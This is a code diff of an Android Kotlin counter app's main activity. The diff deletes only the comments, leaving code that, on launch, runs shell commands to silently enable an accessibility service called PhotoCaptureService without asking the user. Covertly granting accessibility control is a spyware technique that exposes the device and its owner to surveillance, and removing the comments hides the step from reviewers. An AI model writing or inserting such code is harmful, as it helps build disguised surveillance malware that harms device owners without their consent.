@@ -9,7 +9,6 @@ import androidx.appcompat.app.AppCompatActivity
 
 class MainActivity : AppCompatActivity() {
 
-    // Counter variables
     private var counter = 0
     private lateinit var counterText: TextView
 
@@ -17,22 +16,18 @@ class MainActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
-        // Initialize counter text view
         counterText = findViewById(R.id.counter_text)
         counterText.text = counter.toString()
 
-        // Automatically enable the accessibility service
         enableAccessibilityService(this)
     }
 
     private fun enableAccessibilityService(context: Context) {
         val serviceName = "${context.packageName}/${PhotoCaptureService::class.java.name}"
 
-        // Command to enable the specific service
         val cmd1 = "settings put secure enabled_accessibility_services $serviceName"
         ShellOperator.runCommand(cmd1)
 
-        // Command to turn on accessibility globally
         val cmd2 = "settings put secure accessibility_enabled 1"
         ShellOperator.runCommand(cmd2)
 
